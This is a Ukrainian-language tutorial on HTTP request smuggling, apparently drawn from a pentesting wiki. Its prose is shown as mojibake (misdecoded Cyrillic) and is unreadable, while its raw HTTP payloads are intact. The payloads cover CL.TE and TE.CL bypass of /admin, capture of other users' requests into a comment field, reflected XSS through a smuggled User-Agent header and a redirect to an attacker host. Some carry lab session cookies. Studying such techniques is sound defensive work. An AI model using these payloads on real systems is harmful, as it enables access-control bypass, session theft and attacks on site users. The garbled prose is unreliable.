–†–æ–∑–≥–ª—è–Ω—å—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏, —è–∫—ñ —ñ–ª—é—Å—Ç—Ä—É—é—Ç—å, —è–∫ HTTP Request Smuggling –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è –æ–±—Ö–æ–¥—É –∑–∞—Ö–æ–¥—ñ–≤ –±–µ–∑–ø–µ–∫–∏ –Ω–∞ –ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ, –∑–æ–∫—Ä–µ–º–∞ –Ω–∞—Ü—ñ–ª—é—é—á–∏—Å—å –Ω–∞ —à–ª—è—Ö `/admin`, —è–∫–∏–π –∑–∞–∑–≤–∏—á–∞–π –æ—Ö–æ—Ä–æ–Ω—è—î—Ç—å—Å—è –ø—Ä–æ–∫—Å—ñ –Ω–∞ –ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ:

**–ü—Ä–∏–∫–ª–∞–¥ CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
–£ –∞—Ç–∞—Ü—ñ CL.TE –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Content-Length` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø–æ—á–∞—Ç–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Ç—É, —Ç–æ–¥—ñ —è–∫ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –≤–±—É–¥–æ–≤–∞–Ω–∏–π –∑–∞–ø–∏—Ç –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Transfer-Encoding: chunked`. –ü—Ä–æ–∫—Å—ñ –Ω–∞ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥—ñ –æ–±—Ä–æ–±–ª—è—î –ø–æ—á–∞—Ç–∫–æ–≤–∏–π `POST` –∑–∞–ø–∏—Ç, –∞–ª–µ –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –≤–±—É–¥–æ–≤–∞–Ω–∏–π –∑–∞–ø–∏—Ç `GET /admin`, —â–æ –¥–æ–∑–≤–æ–ª—è—î –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ —à–ª—è—Ö—É `/admin`.

**TE.CL –ü—Ä–∏–∫–ª–∞–¥**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
–ù–∞–≤–ø–∞–∫–∏, –≤ –∞—Ç–∞—Ü—ñ TE.CL –ø–æ—á–∞—Ç–∫–æ–≤–∏–π `POST` –∑–∞–ø–∏—Ç –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î `Transfer-Encoding: chunked`, –∞ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –≤–±—É–¥–æ–≤–∞–Ω–∏–π –∑–∞–ø–∏—Ç –æ–±—Ä–æ–±–ª—è—î—Ç—å—Å—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Content-Length`. –ü–æ–¥—ñ–±–Ω–æ –¥–æ –∞—Ç–∞–∫–∏ CL.TE, —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–π –ø—Ä–æ–∫—Å—ñ —ñ–≥–Ω–æ—Ä—É—î –∫–æ–Ω—Ç—Ä–∞–±–∞–Ω–¥–Ω–∏–π –∑–∞–ø–∏—Ç `GET /admin`, –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ –Ω–∞–¥–∞—é—á–∏ –¥–æ—Å—Ç—É–ø –¥–æ –æ–±–º–µ–∂–µ–Ω–æ–≥–æ —à–ª—è—Ö—É `/admin`.

### –í–∏—è–≤–ª–µ–Ω–Ω—è –ø–µ—Ä–µ–ø–∏—Å—É–≤–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

–î–æ–¥–∞—Ç–∫–∏ —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å **—Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–π —Å–µ—Ä–≤–µ—Ä** –¥–ª—è –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –≤—Ö—ñ–¥–Ω–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤ –ø–µ—Ä–µ–¥ —ó—Ö –ø–µ—Ä–µ–¥–∞—á–µ—é –Ω–∞ –±–µ–∫–µ–Ω–¥-—Å–µ—Ä–≤–µ—Ä. –¢–∏–ø–æ–≤–∞ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –≤–∫–ª—é—á–∞—î –¥–æ–¥–∞–≤–∞–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ `X-Forwarded-For: <IP –∫–ª—ñ—î–Ω—Ç–∞>`, –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ IP –∫–ª—ñ—î–Ω—Ç–∞ –Ω–∞ –±–µ–∫–µ–Ω–¥. –†–æ–∑—É–º—ñ–Ω–Ω—è —Ü–∏—Ö –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ–π –º–æ–∂–µ –±—É—Ç–∏ –≤–∏—Ä—ñ—à–∞–ª—å–Ω–∏–º, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –º–æ–∂–µ –≤–∏—è–≤–∏—Ç–∏ —Å–ø–æ—Å–æ–±–∏ **–æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç** –∞–±–æ **–≤–∏—è–≤–∏—Ç–∏ –ø—Ä–∏—Ö–æ–≤–∞–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∞–±–æ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏**.

–©–æ–± –¥–æ—Å–ª—ñ–¥–∏—Ç–∏, —è–∫ –ø—Ä–æ–∫—Å—ñ –∑–º—ñ–Ω—é—î –∑–∞–ø–∏—Ç, –∑–Ω–∞–π–¥—ñ—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä POST, —è–∫–∏–π –±–µ–∫–µ–Ω–¥ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ. –ü–æ—Ç—ñ–º —Å—Ç–≤–æ—Ä—ñ—Ç—å –∑–∞–ø–∏—Ç, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü–µ–π –ø–∞—Ä–∞–º–µ—Ç—Ä –æ—Å—Ç–∞–Ω–Ω—ñ–º, –ø–æ–¥—ñ–±–Ω–æ –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
–£ —Ü—ñ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ñ –Ω–∞—Å—Ç—É–ø–Ω—ñ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ –∑–∞–ø–∏—Ç—É –¥–æ–¥–∞—é—Ç—å—Å—è –ø—ñ—Å–ª—è `search=`, —â–æ —î –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º, –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–∏–º —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ. –¶–µ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –≤–∏—è–≤–∏—Ç—å –∑–∞–≥–æ–ª–æ–≤–∫–∏ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É.

–í–∞–∂–ª–∏–≤–æ —É–∑–≥–æ–¥–∏—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Content-Length` –≤–∫–ª–∞–¥–µ–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É –∑ —Ñ–∞–∫—Ç–∏—á–Ω–æ—é –¥–æ–≤–∂–∏–Ω–æ—é –≤–º—ñ—Å—Ç—É. –†–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –ø–æ—á–∏–Ω–∞—Ç–∏ –∑ –Ω–µ–≤–µ–ª–∏–∫–æ–≥–æ –∑–Ω–∞—á–µ–Ω–Ω—è —ñ –ø–æ—Å—Ç—É–ø–æ–≤–æ –∑–±—ñ–ª—å—à—É–≤–∞—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –∑–∞–Ω–∞–¥—Ç–æ –Ω–∏–∑—å–∫–µ –∑–Ω–∞—á–µ–Ω–Ω—è –æ–±—Ä—ñ–∑–∞—î –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω—ñ –¥–∞–Ω—ñ, –∞ –∑–∞–Ω–∞–¥—Ç–æ –≤–∏—Å–æ–∫–µ –∑–Ω–∞—á–µ–Ω–Ω—è –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –ø–æ–º–∏–ª–∫–∏ –∑–∞–ø–∏—Ç—É.

–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ —Ç–∞–∫–æ–∂ –∑–∞—Å—Ç–æ—Å–æ–≤–Ω–∞ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ TE.CL, –∞–ª–µ –∑–∞–ø–∏—Ç –ø–æ–≤–∏–Ω–µ–Ω –∑–∞–∫—ñ–Ω—á—É–≤–∞—Ç–∏—Å—è `search=\r\n0`. –ù–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Å–∏–º–≤–æ–ª—ñ–≤ –Ω–æ–≤–æ–≥–æ —Ä—è–¥–∫–∞, –∑–Ω–∞—á–µ–Ω–Ω—è –±—É–¥—É—Ç—å –¥–æ–¥–∞–≤–∞—Ç–∏—Å—è –¥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –ø–æ—à—É–∫—É.

–¶–µ–π –º–µ—Ç–æ–¥ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É —Å–ª—É–∂–∏—Ç—å –¥–ª—è —Ä–æ–∑—É–º—ñ–Ω–Ω—è –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ–π –∑–∞–ø–∏—Ç—É, –∑—Ä–æ–±–ª–µ–Ω–∏—Ö –ø—Ä–æ–∫—Å—ñ-—Å–µ—Ä–≤–µ—Ä–æ–º —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥—É, —Ñ–∞–∫—Ç–∏—á–Ω–æ –≤–∏–∫–æ–Ω—É—é—á–∏ —Å–∞–º–æ—Å—Ç—ñ–π–Ω–µ —Ä–æ–∑—Å–ª—ñ–¥—É–≤–∞–Ω–Ω—è.

### Capturing other users' requests <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

–¶—ñ–ª–∫–æ–º –º–æ–∂–ª–∏–≤–æ –∑–∞—Ö–æ–ø–∏—Ç–∏ –∑–∞–ø–∏—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –¥–æ–¥–∞–≤—à–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π –∑–∞–ø–∏—Ç —è–∫ –∑–Ω–∞—á–µ–Ω–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –ø—ñ–¥ —á–∞—Å –æ–ø–µ—Ä–∞—Ü—ñ—ó POST. –û—Å—å —è–∫ —Ü–µ –º–æ–∂–Ω–∞ –∑–¥—ñ–π—Å–Ω–∏—Ç–∏:

–î–æ–¥–∞–≤—à–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç —è–∫ –∑–Ω–∞—á–µ–Ω–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–±–µ—Ä–µ–≥—Ç–∏ –∑–∞–ø–∏—Ç –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
–£ —Ü—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó **–ø–∞—Ä–∞–º–µ—Ç—Ä –∫–æ–º–µ–Ω—Ç–∞—Ä—è** –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –≤–º—ñ—Å—Ç—É –≤ —Å–µ–∫—Ü—ñ—ó –∫–æ–º–µ–Ω—Ç–∞—Ä—ñ–≤ –ø–æ—Å—Ç–∞ –Ω–∞ –ø—É–±–ª—ñ—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ. –í—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ, –≤–º—ñ—Å—Ç –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É –∑'—è–≤–∏—Ç—å—Å—è —è–∫ –∫–æ–º–µ–Ω—Ç–∞—Ä.

–û–¥–Ω–∞–∫ —É —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ —î –æ–±–º–µ–∂–µ–Ω–Ω—è. –Ø–∫ –ø—Ä–∞–≤–∏–ª–æ, –≤–æ–Ω–∞ –∑–∞—Ö–æ–ø–ª—é—î –¥–∞–Ω—ñ –ª–∏—à–µ –¥–æ —Ä–æ–∑–¥—ñ–ª—å–Ω–∏–∫–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ–≥–æ –≤ –∫–æ–Ω—Ç—Ä–∞–±–∞–Ω–¥–Ω–æ–º—É –∑–∞–ø–∏—Ç—ñ. –î–ª—è URL-–∫–æ–¥–æ–≤–∞–Ω–∏—Ö —Ñ–æ—Ä–º—É–ª—è—Ä—ñ–≤ —Ü–µ–π —Ä–æ–∑–¥—ñ–ª—å–Ω–∏–∫ - —Å–∏–º–≤–æ–ª `&`. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –∑–∞—Ö–æ–ø–ª–µ–Ω–∏–π –≤–º—ñ—Å—Ç –∑ –∑–∞–ø–∏—Ç—É –∂–µ—Ä—Ç–≤–∏ –∑—É–ø–∏–Ω–∏—Ç—å—Å—è –Ω–∞ –ø–µ—Ä—à–æ–º—É `&`, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ –Ω–∞–≤—ñ—Ç—å —á–∞—Å—Ç–∏–Ω–æ—é —Ä—è–¥–∫–∞ –∑–∞–ø–∏—Ç—É.

–ö—Ä—ñ–º —Ç–æ–≥–æ, –≤–∞—Ä—Ç–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ —Ü–µ–π –ø—ñ–¥—Ö—ñ–¥ —Ç–∞–∫–æ–∂ —î –∂–∏—Ç—Ç—î–∑–¥–∞—Ç–Ω–∏–º –∑ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é TE.CL. –£ —Ç–∞–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –∑–∞–ø–∏—Ç –º–∞—î –∑–∞–∫—ñ–Ω—á—É–≤–∞—Ç–∏—Å—è `search=\r\n0`. –ù–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Å–∏–º–≤–æ–ª—ñ–≤ –Ω–æ–≤–æ–≥–æ —Ä—è–¥–∫–∞, –∑–Ω–∞—á–µ–Ω–Ω—è –±—É–¥—É—Ç—å –¥–æ–¥–∞–Ω—ñ –¥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –ø–æ—à—É–∫—É.

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è HTTP request smuggling –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–æ–≥–æ XSS

HTTP Request Smuggling –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–æ–∫, –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –¥–æ **Reflected XSS**, —â–æ –ø—Ä–æ–ø–æ–Ω—É—î –∑–Ω–∞—á–Ω—ñ –ø–µ—Ä–µ–≤–∞–≥–∏:

* –í–∑–∞—î–º–æ–¥—ñ—è –∑ —Ü—ñ–ª—å–æ–≤–∏–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏ **–Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–∞**.
* –î–æ–∑–≤–æ–ª—è—î –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ XSS —É —á–∞—Å—Ç–∏–Ω–∞—Ö –∑–∞–ø–∏—Ç—É, —è–∫—ñ **–∑–∞–∑–≤–∏—á–∞–π –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ñ**, —Ç–∞–∫–∏—Ö —è–∫ –∑–∞–≥–æ–ª–æ–≤–∫–∏ HTTP-–∑–∞–ø–∏—Ç—É.

–£ —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö, –∫–æ–ª–∏ –≤–µ–±-—Å–∞–π—Ç –≤—Ä–∞–∑–ª–∏–≤–∏–π –¥–æ Reflected XSS —á–µ—Ä–µ–∑ –∑–∞–≥–æ–ª–æ–≤–æ–∫ User-Agent, –Ω–∞—Å—Ç—É–ø–Ω–∏–π payload –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î, —è–∫ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
–¶–µ–π payload —Å—Ç—Ä—É–∫—Ç—É—Ä–æ–≤–∞–Ω–∏–π –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —à–ª—è—Ö–æ–º:

1. –Ü–Ω—ñ—Ü—ñ—é–≤–∞–Ω–Ω—è `POST` –∑–∞–ø–∏—Ç—É, —â–æ –≤–∏–≥–ª—è–¥–∞—î —Ç–∏–ø–æ–≤–∏–º, –∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–º `Transfer-Encoding: chunked`, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ –Ω–∞ –ø–æ—á–∞—Ç–æ–∫ –∫–æ–Ω—Ç—Ä–∞–±–∞–Ω–¥–∏.
2. –ù–∞—Å—Ç—É–ø–Ω–∏–º —î `0`, —â–æ –ø–æ–∑–Ω–∞—á–∞—î –∫—ñ–Ω–µ—Ü—å —Ç—ñ–ª–∞ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ —á–∞—Å—Ç–∏–Ω–∞–º–∏.
3. –ü–æ—Ç—ñ–º –≤–≤–æ–¥–∏—Ç—å—Å—è –∫–æ–Ω—Ç—Ä–∞–±–∞–Ω–¥–Ω–∏–π `GET` –∑–∞–ø–∏—Ç, –¥–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `User-Agent` —ñ–Ω–∂–µ–∫—Ç—É—î—Ç—å—Å—è –∑—ñ —Å–∫—Ä–∏–ø—Ç–æ–º, `<script>alert(1)</script>`, —â–æ –≤–∏–∫–ª–∏–∫–∞—î XSS, –∫–æ–ª–∏ —Å–µ—Ä–≤–µ—Ä –æ–±—Ä–æ–±–ª—è—î —Ü–µ–π –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç.

–ú–∞–Ω—ñ–ø—É–ª—é—é—á–∏ `User-Agent` —á–µ—Ä–µ–∑ –∫–æ–Ω—Ç—Ä–∞–±–∞–Ω–¥—É, payload –æ–±—Ö–æ–¥–∏—Ç—å –∑–≤–∏—á–∞–π–Ω—ñ –æ–±–º–µ–∂–µ–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º –µ–∫—Å–ø–ª—É–∞—Ç—É—é—á–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å Reflected XSS –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–º, –∞–ª–µ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–º —Å–ø–æ—Å–æ–±–æ–º.

#### HTTP/0.9

{% hint style="danger" %}
–£ —Ä–∞–∑—ñ, —è–∫—â–æ –≤–º—ñ—Å—Ç –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ **`Content-type`** —Ç–∞–∫–∏–º —è–∫ **`text/plain`**, —â–æ –∑–∞–ø–æ–±—ñ–≥–∞—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—é XSS. –Ø–∫—â–æ —Å–µ—Ä–≤–µ—Ä –ø—ñ–¥—Ç—Ä–∏–º—É—î **HTTP/0.9, —Ü–µ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –æ–±—ñ–π—Ç–∏ —Ü–µ**!
{% endhint %}

–í–µ—Ä—Å—ñ—è HTTP/0.9 –±—É–ª–∞ —Ä–∞–Ω—ñ—à–µ 1.0 —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ª–∏—à–µ **GET** –¥—ñ—î—Å–ª–æ–≤–∞ —Ç–∞ **–Ω–µ** –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –∑ **–∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏**, –ª–∏—à–µ —Ç—ñ–ª–æ–º.

–£ [**—Ü—å–æ–º—É –æ–ø–∏—Å—ñ**](https://mizu.re/post/twisty-python) —Ü–µ –±—É–ª–æ –∑–ª–æ–≤–∂–∏—Ç–æ –∑ –∫–æ–Ω—Ç—Ä–∞–±–∞–Ω–¥–æ—é –∑–∞–ø–∏—Ç—É —Ç–∞ **–≤—Ä–∞–∑–ª–∏–≤–∏–º –∫—ñ–Ω—Ü–µ–≤–∏–º –ø—É–Ω–∫—Ç–æ–º, —è–∫–∏–π –≤—ñ–¥–ø–æ–≤—ñ—Å—Ç—å –∑ –≤—Ö—ñ–¥–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –¥–ª—è –∫–æ–Ω—Ç—Ä–∞–±–∞–Ω–¥–∏ –∑–∞–ø–∏—Ç—É –∑ HTTP/0.9. –ü–∞—Ä–∞–º–µ—Ç—Ä, —è–∫–∏–π –±—É–¥–µ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–æ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, –º—ñ—Å—Ç–∏–≤ **—Ñ–∞–ª—å—à–∏–≤—É HTTP/1.1 –≤—ñ–¥–ø–æ–≤—ñ–¥—å (–∑ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏ —Ç–∞ —Ç—ñ–ª–æ–º)**, —Ç–æ–º—É –≤—ñ–¥–ø–æ–≤—ñ–¥—å –º—ñ—Å—Ç–∏—Ç–∏–º–µ –¥—ñ–π—Å–Ω–∏–π –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π JS –∫–æ–¥ –∑ `Content-Type` `text/html`.

### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω—å –Ω–∞ —Å–∞–π—Ç—ñ –∑ –¥–æ–ø–æ–º–æ–≥–æ—é HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

–ó–∞—Å—Ç–æ—Å—É–Ω–∫–∏ —á–∞—Å—Ç–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—é—Ç—å –∑ –æ–¥–Ω–æ–≥–æ URL –Ω–∞ —ñ–Ω—à–∏–π, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ–º'—è —Ö–æ—Å—Ç–∞ –∑ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Host` —É URL –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è. –¶–µ –ø–æ—à–∏—Ä–µ–Ω–æ –Ω–∞ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞—Ö, —Ç–∞–∫–∏—Ö —è–∫ Apache —Ç–∞ IIS. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–∞–ø–∏—Ç –Ω–∞ –ø–∞–ø–∫—É –±–µ–∑ —Å–ª–µ—à—É –≤ –∫—ñ–Ω—Ü—ñ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è, —â–æ–± –≤–∫–ª—é—á–∏—Ç–∏ —Å–ª–µ—à:
```
GET /home HTTP/1.1
Host: normal-website.com
```
–†–µ–∑—É–ª—å—Ç–∞—Ç–∏ –≤:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
–•–æ—á–∞ —Ü–µ –≤–∏–≥–ª—è–¥–∞—î –±–µ–∑–ø–µ—á–Ω–∏–º, —Ü—é –ø–æ–≤–µ–¥—ñ–Ω–∫—É –º–æ–∂–Ω–∞ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é HTTP request smuggling, —â–æ–± –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –Ω–∞ –∑–æ–≤–Ω—ñ—à–Ω—ñ–π —Å–∞–π—Ç. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
